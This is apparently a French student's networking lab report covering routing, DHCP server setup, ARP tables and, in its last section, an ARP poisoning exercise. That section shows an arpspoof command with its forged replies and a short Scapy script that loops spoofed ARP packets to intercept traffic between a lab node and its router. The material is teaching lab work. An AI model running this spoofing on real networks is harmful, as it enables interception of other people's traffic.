# TP2 : Routage, DHCP et DNS

# Sommaire

- [TP2 : Routage, DHCP et DNS](#tp2--routage-dhcp-et-dns)
- [Sommaire](#sommaire)
- [0. Setup](#0-setup)
- [I. Routage](#i-routage)
- [II. Serveur DHCP](#ii-serveur-dhcp)
- [III. ARP](#iii-arp)
  - [1. Les tables ARP](#1-les-tables-arp)
  - [2. ARP poisoning](#2-arp-poisoning)


# I. Routage

![Topo 1](./img/topo1.png)

➜ **Tableau d'adressage**

| Nom                | IP              |
| ------------------ | --------------- |
| `router.tp2.efrei` | `10.2.1.254/24` |
| `node1.tp2.efrei`  | `10.2.1.1/24`   |



🌞 **Configuration de `router.tp2.efrei`**

Configiration router dhcp
~~~

[root@localhost ~]$ [root@localhost ~]$ sudo vi /etc/sysconfig/network-scripts/ifcfg-enp0s8

DEVICE=enp0s8
NAME=routeur

ONBOOT=yes
BOOTPROTO=dhcp

[root@localhost ~]$ sudo nmcli connection reload
[root@localhost ~]$ sudo nmcli connection up routeur

[root@localhost ~]$ ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=113 time=62.8 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=113 time=31.1 ms
~~~
IP A:
~~~

[root@localhost ~]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:86:d8:bc brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.234/24 brd 192.168.122.255 scope global dynamic noprefixroute enp0s8
       valid_lft 3438sec preferred_lft 3438sec
    inet6 fe80::a00:27ff:fe86:d8bc/64 scope link
       valid_lft forever preferred_lft forever
3: enp0s3: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 08:00:27:10:92:a8 brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute enp0s9
       valid_lft forever preferred_lft forever

~~~


🌞 **Configuration de `node1.tp2.efrei`**

Config IP static:
~~~

PC1> ip 10.2.1.1/24
Checking for duplicate address...
PC1 : 10.2.1.1 255.255.255.0

PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.1/24
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 10003
RHOST:PORT  : 127.0.0.1:10004
MTU:        : 1500
~~~

PING routeur:
~~~
PC1> ping 10.2.1.254
84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=15.074 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=13.887 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=9.982 ms
~~~

Route et vérif connexion:
~~~
PC1> ip 10.2.1.1 255.255.255.0 10.2.1.254
Checking for duplicate address...
PC1 : 10.2.1.1 255.255.255.0 gateway 10.2.1.254

PC1> ping 8.8.8.8
84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=39.163 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=93.919 ms

PC1> trace 8.8.8.8
trace to 8.8.8.8, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   11.186 ms  8.921 ms  9.823 ms
 2   192.168.122.1   13.743 ms  14.698 ms  13.451 ms
 3   10.0.3.2   15.292 ms  17.032 ms  13.098 ms
 4     *  *  *
~~~

🌞 **Afficher la CAM Table du switch**
Mac Adress table :
~~~

IOU1#show mac adress-table
                ^
% Invalid input detected at '^' marker.

IOU1#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/1
   1    0800.27d8.740e    DYNAMIC     Et0/0
Total Mac Addresses for this criterion: 2
IOU1#
~~~


➜ **Tableau d'adressage**

| Nom                | IP              |
| ------------------ | --------------- |
| `router.tp2.efrei` | `10.2.1.254/24` |
| `node1.tp2.efrei`  | `N/A`           |
| `dhcp.tp2.efrei`   | `10.2.1.253/24` |



🌞 **Install et conf du serveur DHCP** sur `dhcp.tp2.efrei`

~~~
[bob2@localhost ~]$ sudo dnf install dhcp-server -y
Last metadata expiration check: 0:00:40 ago on Mon Dec  13 12:16:56 2024.
Dependencies resolved.
========================================================================================================================
 Package                      Architecture            Version                             Repository               Size
========================================================================================================================
Installing:
 dhcp-server                  x86_64                  12:4.4.2-19.b1.el9                  baseos                  1.2 M
Installing dependencies:
 dhcp-common                  noarch                  12:4.4.2-19.b1.el9                  baseos                  128 k
 ...

 ~~~
Accès internet:
 ~~~
'/etc/sysconfig/network-scripts/ifcfg-emp0s3' [New] 9L, 112B written
[root@localhost ~]# sudo nmcli connection reload
[root@localhost ~]# sudo nmcli connection up lan
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/17)
[root@localhost ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: emp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:41:f1:31 brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.253/24 brd 10.2.1.255 scope global noprefixroute emp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe41:f131/64 scope link 
       valid_lft forever preferred_lft forever
[root@localhost ~]# ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=114 time=38.3 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=114 time=32.0 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=114 time=33.6 ms
^C
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2007ms
rtt min/avg/max/mdev = 31.956/34.630/38.302/2.684 ms
[root@localhost ~]# cat /etc/sysconfig/network-scripts/ifcfg-emp0s3
DEVICE=emp0s3
NAME=lan
ONBOOT=yes
BOOTPROTO=static
IPADDR=10.2.1.253
NETMASK=255.255.255.0
GATEWAY=10.2.1.254
[root@localhost ~]#

 ~~~
Config dhcp:
~~~
[root@localhost ~]# sudo systemctl enable dhcpd
1880.062191 systemd-rc-local-generator[14831]: /etc/rc.d/rc.local is not marked executable, skipping.
[root@localhost ~]# sudo systemctl start dhcpd
[root@localhost ~]# sudo systemctl status dhcpd
● dhcpd.service - DHCPv4 Server Daemon
   Loaded: loaded (/usr/lib/systemd/system/dhcpd.service; enabled; preset: disabled)
   Active: active (running) since Fri 2024-12-13 17:37:36 CET; 28s ago
     Docs: man:dhcpd(8)
           man:dhcpd.conf(5)
 Main PID: 1468 (dhcpd)
   Status: "Dispatching packets..."
    Tasks: 1 (limit: 11084)
   Memory: 4.6M
   CPU: 28ms
   CGroup: /system.slice/dhcpd.service
           └─1468 /usr/sbin/dhcpd -f -cf /etc/dhcp/dhcpd.conf -user dhcpd -group dhcpd --no-pid

Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Config file: /etc/dhcp/dhcpd.conf
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Database file: /var/lib/dhcpd/dhcpd.leases
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: PID file: /var/run/dhcpd.pid
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Source compiled to use binary-leases
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Wrote 0 leases to leases file.
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Listening on LPF/emp0s3/08:00:27:41:f1:31/10.2.1.0/24
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Sending on   LPF/emp0s3/08:00:27:41:f1:31/10.2.1.0/24
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Sending on   Socket/fallback/fallback-net
Dec 13 17:37:36 localhost.localdomain dhcpd[14681]: Server starting service.
Dec 13 17:37:36 localhost.localdomain systemd[1]: Started DHCPv4 Server Daemon.
[root@localhost ~]#

~~~
Traceroute:
~~~
[root@localhost ~]# traceroute 8.8.8.8
traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
 1  _gateway (10.2.1.254)            23.951 ms  21.493 ms  20.174 ms
 2  192.168.122.1 (192.168.122.1)    18.946 ms  19.023 ms  18.225 ms
 3  10.0.3.2 (10.0.3.2)             17.705 ms  21.336 ms  24.161 ms
 4  * * *
 5  * * *

~~~

🌞 **Test du DHCP** sur `node1.tp2.efrei`

~~~
PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 8.8.8.8  8.8.4.4
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43163, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 10004
RHOST:PORT  : 127.0.0.1:10005
MTU:        : 1500

PC1> ping 8.8.8.8
84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=32.158 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=33.782 ms

~~~

🌟 **BONUS**

traceroute 1.1.1.1:
~~~
[root@localhost ~]# traceroute 1.1.1.1
traceroute to 1.1.1.1 (1.1.1.1), 30 hops max, 60 byte packets
 1  _gateway (10.2.1.254)            122.900 ms  13.757 ms  14.183 ms
 2  192.168.122.1 (192.168.122.1)    14.135 ms  13.196 ms  35.193ms
 3  10.0.3.2 (10.0.3.2)             34.590 ms  33.691 ms  32.675 ms
 ~~~
Show IP pc1:
~~~
PC1> dhcp
DORA IP 10.2.1.10/24 GW 10.2.1.254

PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 42603, 42610/21305/37283
MAC         : 00:50:79:66:68:00
LPORT       : 10004
RHOST:PORT  : 127.0.0.1:10005
MTU:        : 1500

PC1>
~~~

🌞 **Wireshark it !**

[DHCP](./tp2/wireshark.dhcp.tp2.pcapng)

# III. ARP

## 1. Les tables ARP


🌞 **Affichez la table ARP de `router.tp2.efrei`**

~~~
[root@localhost ~]# ip n s
10.2.1.10 dev enp0s3 lladdr 00:50:79:66:68:00 REACHABLE
192.168.122.1 dev enp0s8 lladdr 52:54:00:23:04:c2 REACHABLE
10.2.1.253 dev enp0s3 lladdr 08:00:27:41:f1:31 DELAY
[root@localhost ~]#
~~~

🌞 **Capturez l'échange ARP avec Wireshark**

[ARP](./arpTP2.pcapng)

## 2. ARP poisoning

**Insérer une machine attaquante dans la topologie. Un Kali linux, ou n'importe quel autre OS de votre choix.**

🌞 **Envoyer une trame ARP arbitraire**

ArPing KALI:
~~~
┌──(kali㉿kali)-[~]
└─$ sudo arping 10.2.1.10
[sudo] password for kali: 
ARPING 10.2.1.10
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=0 time=12.282 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=1 time=15.088 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=2 time=9.155 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=3 time=12.603 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=4 time=9.900 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=5 time=9.944 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=6 time=8.135 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=7 time=15.227 msec
^C
--- 10.2.1.10 statistics ---
4 packets transmitted, 8 packets received,   0% unanswered (4 extra)
rtt min/avg/max/std-dev = 8.135/11.542/15.227/2.510 ms
~~~

~~~
PC1> arp

08:00:27:41:f1:31  10.2.1.253 expires in 117 seconds

PC1>
~~~

🌞 **Mettre en place un ARP MITM**

~~~
┌──(kali㉿kali)-[~]
└─$ sudo arpspoof -r -t 10.2.1.10 10.2.1.254
8:0:27:d0:85:88 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at 8:0:27:d0:85:88
8:0:27:d0:85:88 8:0:27:d8:74:e 0806 42: arp reply 10.2.1.10 is-at 8:0:27:d0:85:88
8:0:27:d0:85:88 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at 8:0:27:d0:85:88
8:0:27:d0:85:88 8:0:27:d8:74:e 0806 42: arp reply 10.2.1.10 is-at 8:0:27:d0:85:88
8:0:27:d0:85:88 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at 8:0:27:d0:85:88
8:0:27:d0:85:88 8:0:27:d8:74:e 0806 42: arp reply 10.2.1.10 is-at 8:0:27:d0:85:88
~~~


🌞 **Capture Wireshark `arp_mitm.pcap`**

[arp_MITM](./arp_mitm.pcapng)

🌞 **Réaliser la même attaque avec Scapy**

réalisé dans la kali:
~~~
from scapy.all import *

pk = Ether(dst="08:00:27:8d:55:5f")/ARP (pdst="10.2.1.10", psrc="10.2.1.254")
pk2 = Ether(dst="08:00:27:d9:f1:c8")/ARP (pdst="10.2.1.254", psrc="10.2.1.10")

while True:
	sendp(pk, iface="enp0s3")
	sendp(pk2, iface="enp0s3")
~~~
